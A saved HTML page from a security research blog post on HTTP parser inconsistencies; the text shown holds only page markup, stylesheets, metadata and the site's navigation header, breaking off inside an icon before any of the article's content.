<!DOCTYPE html>
<!-- saved from url=(0065)https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies -->
<html lang="en" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><link rel="canonical" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies"><title>(Research) Exploiting HTTP Parsers Inconsistencies</title><meta name="description" content="In this cybersecurity research, I&#39;m going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF]."><meta property="og:title" content="(Research) Exploiting HTTP Parsers Inconsistencies"><meta property="og:description" content="In this cybersecurity research, I&#39;m going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF]."><meta property="og:site_name" content="Rafa&#39;s Blog"><meta property="og:type" content="article"><meta property="og:url" content="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies"><meta name="image" property="og:image" content="https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1687022613860%2F91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif%3Fw%3D1200%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng"><meta name="author" content="Rafael da Costa Santos"><meta property="article:author" content="https://hashnode.com/@rafax00"><link rel="author" href="https://hashnode.com/@rafax00"><link rel="icon" type="image/png" href="https://cdn.hashnode.com/res/hashnode/image/upload/v1686748925239/Z6OQdUJ0q.gif?auto=format,compress&amp;gif-q=60&amp;format=webm&amp;fm=png"><meta name="theme-color" content="#0f172a"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:title" content="(Research) Exploiting HTTP Parsers Inconsistencies"><meta property="twitter:description" content="In this cybersecurity research, I&#39;m going to show inconsistencies within HTTP parsers of various web applications. [Cache Poisoning, Desync Attacks, SSRF]."><meta property="twitter:image" content="https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1687022613860%2F91867fcc-2a19-4dfb-8fd5-5758b016ad37.avif%3Fw%3D1200%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng"><style>/* Monkai theme */
          .hljs{display:block;overflow-x:auto;padding:.5em;background:#23241f}.hljs,.hljs-subst,.hljs-tag{color:#f8f8f2}.hljs-emphasis,.hljs-strong{color:#a8a8a2}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ae81ff}.hljs-code,.hljs-section,.hljs-selector-class,.hljs-title{color:#a6e22e}.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}.hljs-attr,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#f92672}.hljs-attribute,.hljs-symbol{color:#66d9ef}.hljs-class .hljs-title,.hljs-params{color:#f8f8f2}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-string,.hljs-template-variable,.hljs-type,.hljs-variable{color:#e6db74}.hljs-comment,.hljs-deletion,.hljs-meta{color:#75715e}
            /* Monkai theme ends */</style><link rel="alternate" type="application/rss+xml" title="RSS Feed for (Research) Exploiting HTTP Parsers Inconsistencies" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies/rss.xml"><style>:root { --color-custom-header: #0f172a; }</style><meta name="next-head-count" content="23"><style>#nprogress{pointer-events:none}#nprogress .bar{background:#29d;position:fixed;z-index:1031;top:0;left:0;width:100%;height:2px}#nprogress .peg{display:block;position:absolute;right:0;width:100px;height:100%;box-shadow:0 0 10px #29d,0 0 5px #29d;opacity:1;-webkit-transform:rotate(3deg) translate(0,-4px);-ms-transform:rotate(3deg) translate(0,-4px);transform:rotate(3deg) translate(0,-4px)}#nprogress .spinner{display:block;position:fixed;z-index:1031;top:15px;right:15px}#nprogress .spinner-icon{width:18px;height:18px;box-sizing:border-box;border:solid 2px transparent;border-top-color:#29d;border-left-color:#29d;border-radius:50%;-webkit-animation:nprogress-spinner .4s linear infinite;animation:nprogress-spinner .4s linear infinite}.nprogress-custom-parent{overflow:hidden;position:relative}.nprogress-custom-parent #nprogress .bar,.nprogress-custom-parent #nprogress .spinner{position:absolute}@-webkit-keyframes nprogress-spinner{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(360deg)}}@keyframes nprogress-spinner{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/iframe-resizer.js" async="" defer=""></script><script async="" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/js"></script><script type="text/javascript">
    window.dataLayer = window.dataLayer || [];
    function gtag(){window.dataLayer.push(arguments);}
    gtag('js', new Date());
  </script><link rel="preload" href="https://rafa.hashnode.dev/_next/static/media/c9a5bc6a7c948fb0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"><link rel="preload" href="https://rafa.hashnode.dev/_next/static/media/2b3f1035ed87a788-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"><link rel="preload" href="./(Research) Exploiting HTTP Parsers Inconsistencies_files/575f14373604df10.css" as="style"><link rel="stylesheet" href="./(Research) Exploiting HTTP Parsers Inconsistencies_files/575f14373604df10.css" data-n-g=""><noscript data-n-css=""></noscript><script defer="" nomodule="" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/polyfills-c67a75d1b6f99dc8.js"></script><script defer="" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/8820-56721d947d773244.js"></script><script defer="" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/7726.745bb052814a0014.js"></script><script defer="" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/7138-08903210738f849d.js"></script><script defer="" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/7179.77cb5f8d5d46dfcd.js"></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/webpack-c27dd125998ddbde.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/framework-ce84985cd166733a.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/main-999609f14ec7de7a.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/_app-24f83f9e0ecd8c07.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/4661-05c690868afee715.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/6933-50ae92b4d48b63c9.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/[...slug]-bc83241aafcc901c.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/_buildManifest.js" defer=""></script><script src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/_ssgManifest.js" defer=""></script><style id="__jsx-3628769639">html{--font-inter:__Inter_d9825c;--font-plus-jakarta-sans:__Plus_Jakarta_Sans_0f9e2f}</style><style type="text/css">html[dir=ltr],[data-sonner-toaster][dir=ltr]{--toast-icon-margin-start: -3px;--toast-icon-margin-end: 4px;--toast-svg-margin-start: -1px;--toast-svg-margin-end: 0px;--toast-button-margin-start: auto;--toast-button-margin-end: 0;--toast-close-button-start: 0;--toast-close-button-end: unset;--toast-close-button-transform: translate(-35%, -35%)}html[dir=rtl],[data-sonner-toaster][dir=rtl]{--toast-icon-margin-start: 4px;--toast-icon-margin-end: -3px;--toast-svg-margin-start: 0px;--toast-svg-margin-end: -1px;--toast-button-margin-start: 0;--toast-button-margin-end: auto;--toast-close-button-start: unset;--toast-close-button-end: 0;--toast-close-button-transform: translate(35%, -35%)}[data-sonner-toaster]{position:fixed;width:var(--width);font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;--gray1: hsl(0, 0%, 99%);--gray2: hsl(0, 0%, 97.3%);--gray3: hsl(0, 0%, 95.1%);--gray4: hsl(0, 0%, 93%);--gray5: hsl(0, 0%, 90.9%);--gray6: hsl(0, 0%, 88.7%);--gray7: hsl(0, 0%, 85.8%);--gray8: hsl(0, 0%, 78%);--gray9: hsl(0, 0%, 56.1%);--gray10: hsl(0, 0%, 52.3%);--gray11: hsl(0, 0%, 43.5%);--gray12: hsl(0, 0%, 9%);--border-radius: 8px;box-sizing:border-box;padding:0;margin:0;list-style:none;outline:none;z-index:999999999}[data-sonner-toaster][data-x-position=right]{right:max(var(--offset),env(safe-area-inset-right))}[data-sonner-toaster][data-x-position=left]{left:max(var(--offset),env(safe-area-inset-left))}[data-sonner-toaster][data-x-position=center]{left:50%;transform:translate(-50%)}[data-sonner-toaster][data-y-position=top]{top:max(var(--offset),env(safe-area-inset-top))}[data-sonner-toaster][data-y-position=bottom]{bottom:max(var(--offset),env(safe-area-inset-bottom))}[data-sonner-toast]{--y: translateY(100%);--lift-amount: calc(var(--lift) * var(--gap));z-index:var(--z-index);position:absolute;opacity:0;transform:var(--y);touch-action:none;will-change:transform,opacity,height;transition:transform .4s,opacity .4s,height .4s,box-shadow .2s;box-sizing:border-box;outline:none;overflow-wrap:anywhere}[data-sonner-toast][data-styled=true]{padding:16px;background:var(--normal-bg);border:1px solid var(--normal-border);color:var(--normal-text);border-radius:var(--border-radius);box-shadow:0 4px 12px #0000001a;width:var(--width);font-size:13px;display:flex;align-items:center;gap:6px}[data-sonner-toast]:focus-visible{box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}[data-sonner-toast][data-y-position=top]{top:0;--y: translateY(-100%);--lift: 1;--lift-amount: calc(1 * var(--gap))}[data-sonner-toast][data-y-position=bottom]{bottom:0;--y: translateY(100%);--lift: -1;--lift-amount: calc(var(--lift) * var(--gap))}[data-sonner-toast] [data-description]{font-weight:400;line-height:1.4;color:inherit}[data-sonner-toast] [data-title]{font-weight:500;line-height:1.5;color:inherit}[data-sonner-toast] [data-icon]{display:flex;height:16px;width:16px;position:relative;justify-content:flex-start;align-items:center;flex-shrink:0;margin-left:var(--toast-icon-margin-start);margin-right:var(--toast-icon-margin-end)}[data-sonner-toast][data-promise=true] [data-icon]>svg{opacity:0;transform:scale(.8);transform-origin:center;animation:sonner-fade-in .3s ease forwards}[data-sonner-toast] [data-icon]>*{flex-shrink:0}[data-sonner-toast] [data-icon] svg{margin-left:var(--toast-svg-margin-start);margin-right:var(--toast-svg-margin-end)}[data-sonner-toast] [data-content]{display:flex;flex-direction:column;gap:2px}[data-sonner-toast] [data-button]{border-radius:4px;padding-left:8px;padding-right:8px;height:24px;font-size:12px;color:var(--normal-bg);background:var(--normal-text);margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end);border:none;cursor:pointer;outline:none;transition:opacity .4s,box-shadow .2s}[data-sonner-toast] [data-button]:focus-visible{box-shadow:0 0 0 2px #0006}[data-sonner-toast] [data-button]:first-of-type{margin-left:var(--toast-button-margin-start);margin-right:var(--toast-button-margin-end)}[data-sonner-toast] [data-cancel]{color:var(--normal-text);background:rgba(0,0,0,.08)}[data-sonner-toast][data-theme=dark] [data-cancel]{background:rgba(255,255,255,.3)}[data-sonner-toast] [data-close-button]{position:absolute;left:var(--toast-close-button-start);right:var(--toast-close-button-end);top:0;height:20px;width:20px;display:flex;justify-content:center;align-items:center;padding:0;background:var(--gray1);color:var(--gray12);border:1px solid var(--gray4);transform:var(--toast-close-button-transform);border-radius:50%;opacity:0;cursor:pointer;z-index:1;transition:opacity .1s,background .2s,border-color .2s}[data-sonner-toast] [data-close-button]:focus-visible{box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}[data-sonner-toast] [data-disabled=true]{cursor:not-allowed}[data-sonner-toast]:hover [data-close-button]{opacity:1}[data-sonner-toast]:focus [data-close-button]{opacity:1}[data-sonner-toast]:focus-within [data-close-button]{opacity:1}[data-sonner-toast]:hover [data-close-button]:hover{background:var(--gray2);border-color:var(--gray5)}[data-sonner-toast][data-swiping=true]:before{content:"";position:absolute;left:0;right:0;height:100%}[data-sonner-toast][data-y-position=top][data-swiping=true]:before{bottom:50%;transform:scaleY(3) translateY(50%)}[data-sonner-toast][data-y-position=bottom][data-swiping=true]:before{top:50%;transform:scaleY(3) translateY(-50%)}[data-sonner-toast][data-swiping=false][data-removed=true]:before{content:"";position:absolute;inset:0;transform:scaleY(2)}[data-sonner-toast]:after{content:"";position:absolute;left:0;height:calc(var(--gap) + 1px);bottom:100%;width:100%}[data-sonner-toast][data-mounted=true]{--y: translateY(0);opacity:1}[data-sonner-toast][data-expanded=false][data-front=false]{--scale: var(--toasts-before) * .05 + 1;--y: translateY( calc(var(--lift-amount) * var(--toasts-before)) ) scale(calc(-1 * var(--scale)));height:var(--front-toast-height)}[data-sonner-toast]>*{transition:opacity .4s}[data-sonner-toast][data-expanded=false][data-front=false][data-styled=true]>*{opacity:0}[data-sonner-toast][data-visible=false]{opacity:0;pointer-events:none}[data-sonner-toast][data-mounted=true][data-expanded=true]{--y: translateY(calc(var(--lift) * var(--offset)));height:var(--initial-height)}[data-sonner-toast][data-removed=true][data-front=true][data-swipe-out=false]{--y: translateY(calc(var(--lift) * -100%));opacity:0}[data-sonner-toast][data-removed=true][data-front=false][data-swipe-out=false][data-expanded=true]{--y: translateY( calc(var(--lift) * var(--offset) + var(--lift) * -100%) );opacity:0}[data-sonner-toast][data-removed=true][data-front=false][data-swipe-out=false][data-expanded=false]{--y: translateY(40%);opacity:0;transition:transform .5s,opacity .2s}[data-sonner-toast][data-removed=true][data-front=false]:before{height:calc(var(--initial-height) + 20%)}[data-sonner-toast][data-swiping=true]{transform:var(--y) translateY(var(--swipe-amount, 0px));transition:none}[data-sonner-toast][data-swipe-out=true][data-y-position=bottom],[data-sonner-toast][data-swipe-out=true][data-y-position=top]{animation:swipe-out .2s ease-out forwards}@keyframes swipe-out{0%{transform:translateY(calc(var(--lift) * var(--offset) + var(--swipe-amount)));opacity:1}to{transform:translateY(calc(var(--lift) * var(--offset) + var(--swipe-amount) + var(--lift) * -100%));opacity:0}}@media (max-width: 600px){[data-sonner-toaster]{position:fixed;--mobile-offset: 16px;right:var(--mobile-offset);left:var(--mobile-offset);width:100%}[data-sonner-toaster] [data-sonner-toast]{left:0;right:0;width:calc(100% - 32px)}[data-sonner-toaster][data-x-position=left]{left:var(--mobile-offset)}[data-sonner-toaster][data-y-position=bottom]{bottom:20px}[data-sonner-toaster][data-y-position=top]{top:20px}[data-sonner-toaster][data-x-position=center]{left:var(--mobile-offset);right:var(--mobile-offset);transform:none}}[data-sonner-toaster][data-theme=light]{--normal-bg: #fff;--normal-border: var(--gray4);--normal-text: var(--gray12);--success-bg: hsl(143, 85%, 96%);--success-border: hsl(145, 92%, 91%);--success-text: hsl(140, 100%, 27%);--info-bg: hsl(208, 100%, 97%);--info-border: hsl(221, 91%, 91%);--info-text: hsl(210, 92%, 45%);--warning-bg: hsl(49, 100%, 97%);--warning-border: hsl(49, 91%, 91%);--warning-text: hsl(31, 92%, 45%);--error-bg: hsl(359, 100%, 97%);--error-border: hsl(359, 100%, 94%);--error-text: hsl(360, 100%, 45%)}[data-sonner-toaster][data-theme=light] [data-sonner-toast][data-invert=true]{--normal-bg: #000;--normal-border: hsl(0, 0%, 20%);--normal-text: var(--gray1)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast][data-invert=true]{--normal-bg: #fff;--normal-border: var(--gray3);--normal-text: var(--gray12)}[data-sonner-toaster][data-theme=dark]{--normal-bg: #000;--normal-border: hsl(0, 0%, 20%);--normal-text: var(--gray1);--success-bg: hsl(150, 100%, 6%);--success-border: hsl(147, 100%, 12%);--success-text: hsl(150, 86%, 65%);--info-bg: hsl(215, 100%, 6%);--info-border: hsl(223, 100%, 12%);--info-text: hsl(216, 87%, 65%);--warning-bg: hsl(64, 100%, 6%);--warning-border: hsl(60, 100%, 12%);--warning-text: hsl(46, 87%, 65%);--error-bg: hsl(358, 76%, 10%);--error-border: hsl(357, 89%, 16%);--error-text: hsl(358, 100%, 81%)}[data-rich-colors=true] [data-sonner-toast][data-type=success],[data-rich-colors=true] [data-sonner-toast][data-type=success] [data-close-button]{background:var(--success-bg);border-color:var(--success-border);color:var(--success-text)}[data-rich-colors=true] [data-sonner-toast][data-type=info],[data-rich-colors=true] [data-sonner-toast][data-type=info] [data-close-button]{background:var(--info-bg);border-color:var(--info-border);color:var(--info-text)}[data-rich-colors=true] [data-sonner-toast][data-type=warning],[data-rich-colors=true] [data-sonner-toast][data-type=warning] [data-close-button]{background:var(--warning-bg);border-color:var(--warning-border);color:var(--warning-text)}[data-rich-colors=true] [data-sonner-toast][data-type=error],[data-rich-colors=true] [data-sonner-toast][data-type=error] [data-close-button]{background:var(--error-bg);border-color:var(--error-border);color:var(--error-text)}.sonner-loading-wrapper{--size: 16px;height:var(--size);width:var(--size);position:absolute;inset:0;z-index:10}.sonner-loading-wrapper[data-visible=false]{transform-origin:center;animation:sonner-fade-out .2s ease forwards}.sonner-spinner{position:relative;top:50%;left:50%;height:var(--size);width:var(--size)}.sonner-loading-bar{animation:sonner-spin 1.2s linear infinite;background:var(--gray11);border-radius:6px;height:8%;left:-10%;position:absolute;top:-3.9%;width:24%}.sonner-loading-bar:nth-child(1){animation-delay:-1.2s;transform:rotate(.0001deg) translate(146%)}.sonner-loading-bar:nth-child(2){animation-delay:-1.1s;transform:rotate(30deg) translate(146%)}.sonner-loading-bar:nth-child(3){animation-delay:-1s;transform:rotate(60deg) translate(146%)}.sonner-loading-bar:nth-child(4){animation-delay:-.9s;transform:rotate(90deg) translate(146%)}.sonner-loading-bar:nth-child(5){animation-delay:-.8s;transform:rotate(120deg) translate(146%)}.sonner-loading-bar:nth-child(6){animation-delay:-.7s;transform:rotate(150deg) translate(146%)}.sonner-loading-bar:nth-child(7){animation-delay:-.6s;transform:rotate(180deg) translate(146%)}.sonner-loading-bar:nth-child(8){animation-delay:-.5s;transform:rotate(210deg) translate(146%)}.sonner-loading-bar:nth-child(9){animation-delay:-.4s;transform:rotate(240deg) translate(146%)}.sonner-loading-bar:nth-child(10){animation-delay:-.3s;transform:rotate(270deg) translate(146%)}.sonner-loading-bar:nth-child(11){animation-delay:-.2s;transform:rotate(300deg) translate(146%)}.sonner-loading-bar:nth-child(12){animation-delay:-.1s;transform:rotate(330deg) translate(146%)}@keyframes sonner-fade-in{0%{opacity:0;transform:scale(.8)}to{opacity:1;transform:scale(1)}}@keyframes sonner-fade-out{0%{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(.8)}}@keyframes sonner-spin{0%{opacity:1}to{opacity:.15}}@media (prefers-reduced-motion){[data-sonner-toast],[data-sonner-toast]>*,.sonner-loading-bar{transition:none!important;animation:none!important}}
</style><link as="script" rel="prefetch" href="./(Research) Exploiting HTTP Parsers Inconsistencies_files/5772-330b7829e95060dd.js"><link as="script" rel="prefetch" href="./(Research) Exploiting HTTP Parsers Inconsistencies_files/4960-94ed0038f96b4de8.js"><link as="script" rel="prefetch" href="./(Research) Exploiting HTTP Parsers Inconsistencies_files/index-8c420d2431aa5414.js"><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><script type="text/javascript" async="" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/f.txt"></script></head><body class="bg-white leading-normal dark:bg-slate-900"><input type="hidden" id="hn-user"><style id="__jsx-3628769639">html{--font-inter:__Inter_d9825c;--font-plus-jakarta-sans:__Plus_Jakarta_Sans_0f9e2f}</style><div id="__next"><div class="bg-white dark:bg-slate-900" data-theme="light"><script type="application/ld+json">{"@context":"https://schema.org","@type":"NewsArticle","url":"https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies","mainEntityOfPage":"https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies","headline":"Exploiting HTTP Parsers Inconsistencies","description":"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\nIn this resea...","datePublished":"2023-06-17T17:25:25.280Z","dateModified":"2023-10-23T11:36:22.929Z","isAccessibleForFree":true,"author":{"@type":"Person","name":"Rafael da Costa Santos","url":"https://hashnode.com/@rafax00"},"publisher":{"@type":"Organization","name":"Rafa's Blog","url":"https://rafa.hashnode.dev","logo":"https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1559814205701%2Fek9fO-yT0.jpeg%3Fw%3D800%26bm%3Dnormal%26balph%3D100%26txt64%3DUmFmYSdzIEJsb2c%26txtsize%3D42%26txtfit%3Dmax%26txtalign%3Dmiddle%2Ccenter%26txtfont%3DHelvetica%20Neue%2CBold%26txtclr%3Dffffff%26blend%3D0f172a"},"image":{"@type":"ImageObject","url":"https://cdn.hashnode.com/res/hashnode/image/upload/v1686855768304/932a6fc8-23cf-429f-88e2-bee9d6c0d010.png"}}</script><header class="blog-header z-50 w-full border-b relative transform-none md:sticky md:top-0 md:left-0 md:backdrop-blur-lg border-transparent md:border-none" style="background-color: rgb(15, 23, 42); transform: translateY(0px);"><div class="container mx-auto px-2 md:px-4 md:py-1 2xl:px-10"><div class="relative z-40 flex flex-row items-center justify-between pb-2 pt-8 md:py-4"><div class="mb-2 flex flex-row items-center md:mb-0 text-white"><a aria-label="Back to blog home" class="blog-back-to-home-button focus-ring-base flex flex-row items-center rounded-full font-medium transition duration-100 ease-in-out focus-ring-colors-dark-header hover:bg-white/20 mr-2 p-3" data-state="closed" href="https://rafa.hashnode.dev/"><svg class="h-4 w-4 fill-current pr-1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 17"><path d="M7.75135 16.7197L0.885098 9.55347C0.683348 9.31347 0.600098 9.08847 0.600098 8.89722C0.600098 8.70597 0.68331 8.44834 0.850898 8.27509L7.71715 1.10884C8.06035 0.749066 8.6299 0.737366 8.9884 1.08189C9.34933 1.42408 9.36107 1.99576 9.01535 2.35351L2.7466 8.89722L9.0466 15.4747C9.39231 15.831 9.38057 16.404 9.01965 16.7463C8.6626 17.091 8.0926 17.0797 7.75135 16.7197Z"></path></svg></a><div class="mr-2"><button type="button" aria-label="Open blog links" class="blog-bars-button focus-ring-base flex flex-row items-center rounded-full font-medium transition duration-100 ease-in-out focus-ring-colors-dark-header hover:bg-white/20 mr-2 p-2" data-state="closed"><svg class="h-6 w-6 stroke-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20.9889 11.9969H11.9945H3M20.9889 17.8745H3M21 6.12451H3" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button></div><div class="hidden md:block"><h1 class="blog-title text-lg md:text-xl text-left break-words font-heading font-semibold leading-snug md:font-bold text-white"><a href="https://rafa.hashnode.dev/?source=top_nav_blog_home" class="focus-ring-base flex flex-row items-center focus-ring-colors-dark-header" aria-label="Rafa&#39;s Blog home page"><div class="mr-2 h-10 w-10 shrink-0 overflow-hidden rounded-full"><img alt="Rafael da Costa Santos" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/qxI_lhzL_.gif"></div>Rafa's Blog</a></h1></div></div><div class="flex flex-row items-center text-white"><button type="button" aria-label="Open blog search" class="blog-search-button focus-ring-base flex flex-row items-center rounded-full font-medium transition duration-100 ease-in-out focus-ring-colors-dark-header hover:bg-white/20 mr-2 p-2" data-state="closed"><svg class="h-6 w-6 stroke-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><path d="M21 21L15.8091 15.8091M18 10.5C18 14.6421 14.6421 18 10.5 18C6.35786 18 3 14.6421 3 10.5C3 6.35786 6.35786 3 10.5 3C14.6421 3 18 6.35786 18 10.5Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button><button type="button" aria-label="Toggle blog theme" class="blog-theme-switcher focus-ring-base flex flex-row items-center rounded-full font-medium transition duration-100 ease-in-out focus-ring-colors-dark-header hover:bg-white/20 mr-2 p-2" data-state="closed"><svg class="h-6 w-6 stroke-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"><path d="M3 11.4489C3 16.7238 7.16904 21 12.3118 21C16.2709 21 19.6529 18.4657 21 14.8925C19.9331 15.4065 18.7418 15.6938 17.485 15.6938C12.9137 15.6938 9.20787 11.8928 9.20787 7.20396C9.20787 5.24299 9.85605 3.4373 10.9446 2C6.45002 2.6783 3 6.65034 3 11.4489Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></button><div class="hidden md:mr-2 md:block"><button type="button" class="blog-follow-button focus-ring-base flex flex-row items-center rounded-full border-1-1/2 px-4 py-2 text-center text-sm font-medium transition-colors duration-150 hover:bg-opacity-90 disabled:cursor-not-allowed disabled:opacity-50 text-slate-800 bg-white border-white hover:bg-blue-50 focus-ring-colors-dark-header" aria-label="Follow user" data-state="closed"><svg class="mr-2 h-5 w-5 stroke-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2.5 19.25C2.5 15.5221 5.52208 12.5 9.25 12.5V12.5C12.9779 12.5 16 15.5221 16 19.25V19.5C16 20.6046 15.1046 21.5 14 21.5H4.5C3.39543 21.5 2.5 20.6046 2.5 19.5V19.25Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.75 6C12.75 7.933 11.183 9.5 9.25 9.5C7.317 9.5 5.75 7.933 5.75 6C5.75 4.067 7.317 2.5 9.25 2.5C11.183 2.5 12.75 4.067 12.75 6Z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path><path d="M19 7.5V10.5M19 10.5V13.5M19 10.5H16M19 10.5H22" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg><span>Follow</span></button></div><div class="hidden md:mr-2 md:block"><button class="blog-newsletter-button rounded-full border-1-1/2 bg-transparent p-2 transition-colors duration-150 focus-ring-base border-white text-white hover:bg-black/10 dark:border-white dark:text-white dark:hover:bg-black/10 focus-ring-colors-dark-header" type="button" aria-label="Open subscribe to newsletter" data-state="closed"><svg class="h-5 w-5 fill-current" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13.1367 7.50493C13.551 7.50493 13.8867 7.16914 13.8867 6.75493C13.8867 6.34071 13.551 6.00493 13.1367 6.00493V7.50493ZM19.9024 13.0846C19.9024 12.6704 19.5666 12.3346 19.1524 12.3346C18.7382 12.3346 18.4024 12.6704 18.4024 13.0846H19.9024ZM2.5013 9.95291C2.1333 9.76278 1.68084 9.90697 1.49071 10.275C1.30058 10.643 1.44477 11.0954 1.81277 11.2855L2.5013 9.95291ZM16.5938 12.1078C16.9382 11.8778 17.031 11.412 16.8009 11.0676C16.5709 10.7231 16.1051 10.6304 15.7607 10.8604L16.5938 12.1078ZM16.2825 6.01303C15.8683 6.01303 15.5325 6.34882 15.5325 6.76303C15.5325 7.17725 15.8683 7.51303 16.2825 7.51303V6.01303ZM22 7.51303C22.4142 7.51303 22.75 7.17725 22.75 6.76303C22.75 6.34882 22.4142 6.01303 22 6.01303V7.51303ZM18.3913 9.62177C18.3913 10.036 18.727 10.3718 19.1413 10.3718C19.5555 10.3718 19.8913 10.036 19.8913 9.62177H18.3913ZM19.8913 3.9043C19.8913 3.49008 19.5555 3.1543 19.1413 3.1543C18.727 3.1543 18.3913 3.49008 18.3913 3.9043H19.8913ZM8.27708 13.7812L7.93282 14.4475L8.27708 13.7812ZM10.1277 14.5662L10.0103 15.307L10.1277 14.5662ZM11.3949 14.4952L11.1955 13.7722L11.3949 14.4952ZM18.4024 18.1899C18.4024 18.8282 17.8849 19.3457 17.2466 19.3457V20.8457C18.7134 20.8457 19.9024 19.6566 19.9024 18.1899H18.4024ZM17.2466 19.3457H3.90583V20.8457H17.2466V19.3457ZM3.90583 19.3457C3.26748 19.3457 2.75 18.8282 2.75 18.1899H1.25C1.25 19.6566 2.43905 20.8457 3.90583 20.8457V19.3457ZM2.75 18.1899V8.66075H1.25V18.1899H2.75ZM2.75 8.66075C2.75 8.02241 3.26748 7.50493 3.90583 7.50493V6.00493C2.43905 6.00493 1.25 7.19398 1.25 8.66075H2.75ZM3.90583 7.50493H13.1367V6.00493H3.90583V7.50493ZM19.9024 18.1899V13.0846H18.4024V18.1899H19.9024ZM1.81277 11.2855L7.93282 14.4475L8.62134 13.1149L2.5013 9.95291L1.81277 11.2855ZM13.5627 14.1321L16.5938 12.1078L15.7607 10.8604L12.7297 12.8847L13.5627 14.1321ZM16.2825 7.51303H19.1413V6.01303H16.2825V7.51303ZM19.1413 7.51303H22V6.01303H19.1413V7.51303ZM19.8913 